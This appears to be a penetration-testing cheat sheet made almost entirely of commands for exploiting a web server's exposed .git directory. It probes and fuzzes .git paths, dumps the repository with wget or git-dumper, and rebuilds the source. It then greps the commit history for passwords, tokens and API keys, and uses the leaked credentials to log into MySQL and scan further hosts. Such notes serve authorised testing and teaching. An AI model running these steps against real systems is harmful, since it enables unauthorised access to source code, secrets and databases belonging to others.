# Git

> üß† Git Exposure ‚Äì Enumeration & Full Exploitation

```c
# üîç STEP 1: Check for Exposed .git Directory

# Quick manual probe
curl -I http://target.com/.git/
curl -s http://target.com/.git/config

# Check .git HEAD to confirm presence
curl -s http://target.com/.git/HEAD

# Look for repo tree files
curl -s http://target.com/.git/index
curl -s http://target.com/.git/logs/HEAD
curl -s http://target.com/.git/refs/heads/master

# Optional: Use browser extension (DotGit)
# DotGit will alert if .git is publicly exposed

# Fuzzing .git-related paths
feroxbuster -u http://target.com -x .git -w wordlists/git.txt -t 50
ffuf -u http://target.com/FUZZ -w wordlists/git-wordlist.txt -t 50
```

> üß† STEP 2: Download the Entire .git Repository

```c
# Mirror .git directory locally
wget --mirror --no-parent -e robots=off http://target.com/.git/ -P downloaded_git/

# Optional: Use git-dumper.py (from GitTools)
git clone https://github.com/internetwache/GitTools
cd GitTools/Dumper
./git-dumper.py http://target.com/.git/ ./recovered_repo
```

> üõ†Ô∏è STEP 3: Rebuild the Source Code from .git

```c
# Method 1: If dumped with wget
cd downloaded_git/.git
git init
git checkout -- .
# OR
git restore .

# Method 2: If dumped with git-dumper (already reconstructed)
ls -la recovered_repo/

# Check code tree
tree -a

# Optional: View file types & find PHP, ENV, config files
find . -type f | grep -Ei '\.php|\.env|config|credential|key'

# Example: Dump admin.php with database credentials
cat admin.php
```

> üìú STEP 4: Analyze Git History for Sensitive Commits

```c
# List commit history
git log --oneline --graph

# View specific commit (password changes, secrets)
git show <commit_hash>

# Search commits for sensitive strings
git log -p | grep -i 'password\|secret\|apikey\|token'

# List all branches and tags
git branch -a
git tag
```

> üîê STEP 5: Restore Deleted Files (If Missing After Checkout)

```c
# List deleted files
git status

# Restore everything
git checkout -- .
# or
git restore .

# Search again for sensitive files
find . -type f -iname "*.php" -o -iname ".env"
```

> üõ∞Ô∏è STEP 6: Attempt Access Based on Leaked Files

```c
# Look for:
# - admin.php (web credentials)
# - .env (Laravel, Symfony, Node.js, etc.)
# - config/database.php
# - AWS keys
# - API tokens
# - SMTP credentials

# Example: MySQL access
mysql -h <target_ip> -u root -p
# Use credentials found in admin.php or .env

# Example: Laravel Envoy deployment script
cat Envoy.blade.php
# May contain web server IPs, deploy paths, shell tasks

# If remote IP found, scan with Nmap
nmap -Pn -sV -p- <remote_ip>
```
